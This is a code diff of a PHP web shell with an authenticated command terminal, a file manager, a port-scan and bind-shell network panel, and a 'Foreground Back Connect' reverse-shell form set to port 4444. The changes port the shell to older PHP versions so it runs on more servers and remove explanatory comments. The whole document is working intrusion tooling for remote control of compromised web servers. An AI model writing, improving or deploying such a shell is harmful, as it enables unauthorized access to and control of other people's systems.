-            $port_param_raw = trim($_POST['port'] ?? $_POST['backport'] ?? $_POST['scan_ports'] ?? '');
-            $pass_param = $_POST['pass'] ?? $_POST['bind_pass'] ?? '';
+            $host_param_host = isset($_POST['host']) ? $_POST['host'] : (isset($_POST['ip']) ? $_POST['ip'] : '');
+            $host_param = trim($host_param_host);
+            $port_param_raw_port = isset($_POST['port']) ? $_POST['port'] : (isset($_POST['backport']) ? $_POST['backport'] : (isset($_POST['scan_ports']) ? $_POST['scan_ports'] : ''));
+            $port_param_raw = trim($port_param_raw_port);
+            $pass_param_bind = isset($_POST['pass']) ? $_POST['pass'] : (isset($_POST['bind_pass']) ? $_POST['bind_pass'] : '');
+            $pass_param = $pass_param_bind;
             $port_param = 0;
 
             if (is_numeric($port_param_raw) && strpos($port_param_raw, ',') === false && strpos($port_param_raw, '-') === false) {
@@ -1210,7 +1209,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     $output = "[Error] Unknown network sub_action: " . htmlspecialchars($sub_action);
                     break;
             }
-            $response = ['status' => 'success', 'output' => $output];
+            $response = array('status' => 'success', 'output' => $output);
             break;
         
         default:
@@ -1435,7 +1434,7 @@ endif;
             <fieldset>
                 <legend>PHP Foreground Back Connect</legend>
                 <form id="php-back-connect-form"><table>
-                    <tr><td>Target IP/Host:</td><td><input class="inputz" type="text" name="ip" value="<?= htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '127.0.0.1') ?>" required></td></tr>
+                    <tr><td>Target IP/Host:</td><td><input class="inputz" type="text" name="ip" value="<?= htmlspecialchars(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1') ?>" required></td></tr>
                     <tr><td>Port:</td><td><input class="inputz" type="text" name="backport" value="4444" required></td></tr>
                     <tr><td colspan="2" align="center"><button class="inputzbut" type="submit">Connect Back (PHP)</button></td></tr>
                     <tr><td colspan="2"><span class="net-warning">[Warn] Runs in foreground. Page will hang while active.</span></td></tr>
@@ -1548,8 +1547,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const fileModalMessage = document.getElementById('file-modal-message');
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
     const initialFileManagerPath = '<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
+    // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+    const terminalCwdFromServer = '<?php echo addslashes(htmlspecialchars(isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd())); ?>';
     let currentFileManagerPath = initialFileManagerPath;
-    let currentTerminalCwd = '<?php echo addslashes($_SESSION['terminal_cwd'] ?? getcwd()); ?>';
+    let currentTerminalCwd = terminalCwdFromServer;
     let currentEditingFile = '';
     let commandHistory = [];
     let historyIndex = -1;
@@ -1707,8 +1708,6 @@ document.addEventListener('DOMContentLoaded', function() {
             line.appendChild(iframe);
         } else if (type === 'prompt') {
             const newPromptHtml = `<span class="prompt">${htmlEntities(currentTerminalCwd)}&gt; </span>`;
-            // Check if the last element is already a prompt container and update it. Otherwise, create a new one.
-            // This is to handle the initial prompt display correctly.
             if (terminalOutput.lastChild && terminalOutput.lastChild.classList.contains('prompt-container')) {
                  terminalOutput.lastChild.innerHTML = newPromptHtml;
             } else {
@@ -1720,15 +1719,12 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         else {
-            line.innerHTML = text; // Allow HTML for things like port scan results
+            line.innerHTML = text;
         }
         terminalOutput.appendChild(line);
         terminalOutput.scrollTop = terminalOutput.scrollHeight;
     }
 
-    /**
-     * NEW: Executes a command and streams the output to the terminal in real-time.
-     */
     async function streamCommand(command) {
         const outputContainer = document.createElement('div');
         terminalOutput.appendChild(outputContainer);
@@ -1757,7 +1753,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     break;
                 }
                 const chunk = decoder.decode(value, { stream: true });
-                // Append received text chunk to the container
                 outputContainer.textContent += chunk;
                 terminalOutput.scrollTop = terminalOutput.scrollHeight;
             }
@@ -1791,16 +1786,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 terminalOutput.innerHTML = '';
                 appendToTerminalOutput('Terminal cleared.', 'info');
             } else if (commandText.trim().toLowerCase().startsWith('cd')) {
-                // Use old JSON-based request for 'cd' to get CWD update
                 const result = await sendAjaxRequest('execute_command', { command: commandText });
                 if (result.status === 'success' && result.output) {
                     appendToTerminalOutput(result.output);
                 } else if (result.status !== 'success') {
                     appendToTerminalOutput(result.message || 'Error executing command.', 'error');
                 }
-                // CWD is updated globally by sendAjaxRequest
             } else {
-                // Use new streaming fetch for all other commands
                 await streamCommand(commandText);
             }
 
